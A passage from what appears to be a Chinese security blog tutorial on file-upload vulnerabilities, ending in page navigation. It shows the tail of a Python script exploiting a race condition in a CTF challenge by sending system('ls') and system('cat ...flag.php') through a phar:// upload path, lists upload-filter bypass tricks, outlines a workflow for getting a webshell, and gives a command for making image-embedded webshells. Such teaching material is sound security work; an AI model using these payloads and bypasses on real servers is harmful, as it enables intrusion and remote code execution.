punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>data0<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'v'</span><span class="token punctuation">:</span><span class="token string">"phpinfo();"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>data1<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token string">'v'</span><span class="token punctuation">:</span><span class="token string">"system('ls');"</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>data2<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token string">'v'</span><span class="token punctuation">:</span><span class="token string">"system('cat xxxxxxxxxasdasf_flag.php');"</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        url <span class="token operator">=</span> <span class="token string">'http://202.112.51.184:9005/index.php?page=phar://./uploads/'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg/v'</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        t<span class="token operator">=</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span><span class="token punctuation">.</span>content</pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">print</span> i</pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> t<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">print</span> t</pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><h2 id="其它方式绕过"><a class="anchor" href="#其它方式绕过">#</a> 其它方式 — 绕过</h2><h3 id="原理-5"><a class="anchor" href="#原理-5">#</a> 原理</h3><p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p><h3 id="绕过方法-8"><a class="anchor" href="#绕过方法-8">#</a> 绕过方法</h3><pre><code class="language-txt">1. 后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； 
例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】

2. 双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如&quot;php&quot;字符串过滤的； 
例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个&quot;php&quot;字符串&quot;后，
开头的’p’和结尾的’hp’就组合又形成了【php】。

3. 特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； 
例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。
</code></pre><h1 id="常见web-server组合"><a class="anchor" href="#常见web-server组合">#</a> 常见 web server 组合</h1><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>x.asp</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>windows server + asp + access  +  IIS</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>x.aspx</pre></td></tr><tr><td data-num="6"></td><td><pre>windows server + aspx + sql server  +  IIS</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>x.php</pre></td></tr><tr><td data-num="9"></td><td><pre>Linux  + apache + php  + mysql </pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>linux +  ngix  + php  + mysql </pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>x.jsp  x.jspx</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>Linux + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>windows server  + apache tomcat  + jsp +  mysql/sql server/oracle</pre></td></tr></table></figure><h1 id="文件上传检测流程"><a class="anchor" href="#文件上传检测流程">#</a> 文件上传检测流程</h1><h2 id="脑图-by-zksmile"><a class="anchor" href="#脑图-by-zksmile">#</a> 脑图 【by zksmile】</h2><p><img data-src="image005.png" alt=""></p><h2 id="流程"><a class="anchor" href="#流程">#</a> 流程</h2><ol><li><p>寻找上传点网站前台的上传点一般有头像上传、附件上传、证件认证上传。如果通过 SQL 注入或者其它一些技术手段得到网站后台权限，一般在网站更新页面的地方会存在上传点。也可以通过敏感目录或文件扫描工具扫到一些开源编辑器的测试上传页面等等。</p></li><li><p>找到上传点之后，先上传一张正常的图片测试该上传点时候可用。</p></li><li><p>上传一张正常的图片，抓包修改文件后缀名为对应网站脚本语言。<br>该操作可以绕过前端检测、MIME 检测、文件内容检测，可以检测出网站是否对上传文件进行了文件后缀名的检测。<br>如果上传成功表示没有对文件后缀进行检测，可以进一步上传图片马，抓包修改文件后缀为对应网站脚本语言即可获取 webshell.<br>如果上传失败表示对文件名后缀进行了检测，需要进一步判断是黑名单检测还是白名单检测。</p></li><li><p>上传一张正常的图片，在它后缀随便添加几个字符进行上传。<br>eg: &quot;1jpgaaaaa&quot; 该后缀的文件既不在黑名单之内也不在白名单之内，如果文件上传成功代表是黑名单检测，如果上传失败代表是白名单检测。</p></li><li><p>黑名单检测绕过</p><ul><li>文件名大小写绕过</li><li>特殊文件名绕过<br>后缀加上：<ul><li>::$DATA（目标环境在 Windows 下）</li><li>空格和点 (.)，或空格和点的组合（目标环境在 Windows 下）<br>碰到过滤文件名的</li><li>双写文件名 pphphp</li></ul></li><li>0x00 截断绕过</li><li>.htaccess 文件攻击</li><li>php 文件包含漏洞</li><li>Apache 解析漏洞</li><li>Nginx 解析漏洞</li></ul></li><li><p>白名单检测绕过</p><ul><li>0x00 截断绕过</li><li>是否暴露保存路径，保存路径截断，或修改</li><li>php 文件包含漏洞</li><li>IIS 解析漏洞</li><li>Nginx 解析漏洞</li></ul></li></ol><p>图片马制作</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>copy <span class="token number">1</span>.png/b + payload.* <span class="token number">2</span>.png</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>/A           表示 ASCII 文本文件。</pre></td></tr><tr><td data-num="4"></td><td><pre>/B           表示二进制文件。</pre></td></tr></table></figure><div class="tags"><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"><i class="ic i-tag"></i> 文件上传</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-03-13 16:25:09" itemprop="dateModified" datetime="2022-03-13T16:25:09+08:00">2022-03-13</time> </span><span id="PenetrationTest/Web-Security/web漏洞-文件上传/" class="item leancloud_visitors" data-flag-title="web漏洞-文件上传" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/reward.jpg" alt="Or0kit 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Or0kit <i class="ic i-at"><em>@</em></i>Or0kit</li><li class="link"><strong>本文链接：</strong> <a href="https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="web漏洞-文件上传">https://or0kit.github.io/PenetrationTest/Web-Security/web漏洞-文件上传/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/Programming/Python/Python-converts-pictures-into-character-drawings/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicliierfjj20zk0m8npd.jpg" title="Python converts pictures into character drawings"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Python</span><h3>Python converts pictures into character drawings</h3></a></div><div class="item right"><a href="/PenetrationTest/Reference/awesome-web-security/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph47e9vtj20zk0m8x6l.jpg" title="Awesome Web Security【转】"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 转载</span><h3>Awesome Web Security【转】</h3></a></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">介绍文件上传漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E5%85%B3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">有关文件上传的知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">2.1.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">一句话木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">文件上传的攻击与防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text">本地前端限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.2.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.3.</span> <span class="toc-text">操作方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D"><span class="toc-number">3.2.</span> <span class="toc-text">服务器检测扩展名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="toc-number">3.2.1.</span> <span class="toc-text">黑名单策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">白名单策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.2.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-2"><span class="toc-number">3.2.4.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8Bmime"><span class="toc-number">3.3.</span> <span class="toc-text">服务器检测 MIME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.3.1.</span> <span class="toc-text">常见类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-3"><span class="toc-number">3.3.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">文件头检查文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.4.1.</span> <span class="toc-text">常见格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-4"><span class="toc-number">3.4.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6web-server%E5%AF%B9%E7%89%B9%E5%AE%9A%E7%B1%BB%E5%9E%8B%E6%96%87%E4%BB%B6%E7%9A%84%E8%A1%8C%E4%B8%BAhtaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">3.5.</span> <span class="toc-text">限制 Web Server 对特定类型文件的行为 (.htaccess 文件攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">3.5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-5"><span class="toc-number">3.5.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F00%E6%88%AA%E6%96%AD"><span class="toc-number">3.6.</span> <span class="toc-text">文件系统 00 截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">3.6.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-6"><span class="toc-number">3.6.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7windows-ntfs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="toc-number">3.7.</span> <span class="toc-text">7.windows NTFS 文件系统特性绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-7"><span class="toc-number">3.7.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">二次渲染绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">3.9.</span> <span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%B8%80%E9%87%91%E9%A2%9D%E6%8F%90%E7%8E%B0"><span class="toc-number">3.9.1.</span> <span class="toc-text">例一：金额提现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%BA%8Cmoctf%E9%87%8C%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98"><span class="toc-number">3.9.2.</span> <span class="toc-text">例二：moctf 里的一道题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%B8%89xman-easy-gallery"><span class="toc-number">3.9.3.</span> <span class="toc-text">例三：XMAN-Easy Gallery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">3.10.</span> <span class="toc-text">其它方式 — 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">3.10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-8"><span class="toc-number">3.10.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81web-server%E7%BB%84%E5%90%88"><span class="toc-number">4.</span> <span class="toc-text">常见 web server 组合</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">文件上传检测流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%91%E5%9B%BE-by-zksmile"><span class="toc-number">5.1.</span> <span class="toc-text">脑图 【by zksmile】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">流程</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/PenetrationTest/Web-Security/Apache-Config/" rel="bookmark" title="Apache_Config">Apache_Config</a></li><li><a href="/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/" rel="bookmark" title="初学SQLinjection">初学SQLinjection</a></li><li><a href="/PenetrationTest/Web-Security/SQLMAP%E6%80%BB%E7%BB%93/" rel="bookmark" title="SQLMAP总结">SQLMAP总结</a></li><li><a href="/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/" rel="bookmark" title="再学SQLinjection">再学SQLinjection</a></li><li><a href="/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/" rel="bookmark" title="初学XSS">初学XSS</a></li><li><a href="/PenetrationTest/Web-Security/SQL-injection-payload-list/" rel="bookmark" title="SQL-injection-payload-list【转】">SQL-injection-payload-list【转】</a></li><li class="active"><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="web漏洞-文件上传">web漏洞-文件上传</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="web漏洞-文件包含">web漏洞-文件包含</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/" rel="bookmark" title="web漏洞-CSRF">web漏洞-CSRF</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-SSRF/" rel="bookmark" title="web漏洞-SSRF">web漏洞-SSRF</a></li><li><a href="/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/" rel="bookmark" title="初学webshell检测">初学webshell检测</a></li><li><a href="/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="web漏洞-业务逻辑漏洞">web漏洞-业务逻辑漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Or0kit" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Or0kit</p><div class="description" itemprop="description">临渊羡鱼，不如退而结网</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">204</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">48</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">363</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29t" title="https:&#x2F;&#x2F;github.com"><i class="ic i-github"></i></span> <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;twitter.com&#x2F;yourname"><i class="ic i-twitter"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;yourname"><i class="ic i-zhihu"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPXlvdXJuYW1l" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;yourname"><i class="ic i-cloud-music"></i></span> <span class="exturl item weibo" data-url="aHR0cHM6Ly93ZWliby5jb20veW91cm5hbWU=" title="https:&#x2F;&#x2F;weibo.com&#x2F;yourname"><i class="ic i-weibo"></i></span> <span class="exturl item youtube" data-url="aHR0cHM6Ly95b3V0dWJlLmNvbS95b3VybmFtZQ==" title="https:&#x2F;&#x2F;youtube.com&#x2F;yourname"><i class="ic i-youtube"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Programming/Python/Python-converts-pictures-into-character-drawings/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/PenetrationTest/Reference/awesome-web-security/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Programming/" title="分类于 编程">编程</a> <i class="ic i-angle-right"></i> <a href="/categories/Programming/Python/" title="分类于 Python">Python</a></div><span><a href="/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0(%E4%B8%80)%E2%80%94%E2%80%94%E5%8F%96%E4%BB%A3NetCat/" title="BHP第二章(一)——取代NetCat">BHP第二章(一)——取代NetCat</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Win32/" title="分类于 Win32">Win32</a></div><span><a href="/Bin/Win32/Win%E4%B8%B4%E7%95%8C%E5%8C%BA/" title="Win临界区">Win临界区</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/Drive-Development/" title="分类于 驱动开发">驱动开发</a></div><span><a href="/Bin/Core/Drive-Development/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-%E8%B0%83%E8%AF%95%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/" title="驱动开发-调试驱动程序">驱动开发-调试驱动程序</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/" title="分类于 WindowsXp">WindowsXp</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/Process-Thread/" title="分类于 进程与线程">进程与线程</a></div><span><a href="/Bin/Core/WindowsXp/Process-Thread/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93/" title="进程与线程-线程结构体">进程与线程-线程结构体</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/" title="分类于 WindowsXp">WindowsXp</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/Protect-Mode/" title="分类于 保护模式">保护模式</a></div><span><a href="/Bin/Core/WindowsXp/Protect-Mode/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90MmIsAddressValid%E5%87%BD%E6%95%B0-10-10-12/" title="保护模式-逆向分析MmIsAddressValid函数(10-10-12)">保护模式-逆向分析MmIsAddressValid函数(10-10-12)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/WindowsPE/" title="分类于 WindowsPE">WindowsPE</a></div><span><a href="/Bin/WindowsPE/%E6%96%B0%E5%A2%9E%E8%8A%82/" title="新增节">新增节</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/" title="分类于 WindowsXp">WindowsXp</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/MultiCoreSynchronization/" title="分类于 多核同步">多核同步</a></div><span><a href="/Bin/Core/WindowsXp/MultiCoreSynchronization/%E5%A4%9A%E6%A0%B8%E5%90%8C%E6%AD%A5-01%E4%B8%B4%E7%95%8C%E5%8C%BA%E4%B8%8E%E8%87%AA%E6%97%8B%E9%94%81/" title="多核同步-01临界区与自旋锁">多核同步-01临界区与自旋锁</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于 Linux">Linux</a></div><span><a href="/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99-Psad%E7%9A%84%E7%AD%BE%E5%90%8D%E5%8C%B9%E9%85%8D/" title="Linux防火墙-Psad的签名匹配">Linux防火墙-Psad的签名匹配</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web-Security/" title="分类于 web安全">web安全</a></div><span><a href="/PenetrationTest/Web-Security/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/" title="Nmap速查手册">Nmap速查手册</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Bin/" title="分类于 逆向">逆向</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/" title="分类于 内核学习">内核学习</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/" title="分类于 WindowsXp">WindowsXp</a> <i class="ic i-angle-right"></i> <a href="/categories/Bin/Core/WindowsXp/Protect-Mode/" title="分类于 保护模式">保护模式</a></div><span><a href="/Bin/Core/WindowsXp/Protect-Mode/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E9%98%B6%E6%AE%B5%E6%B5%8B%E8%AF%95/" 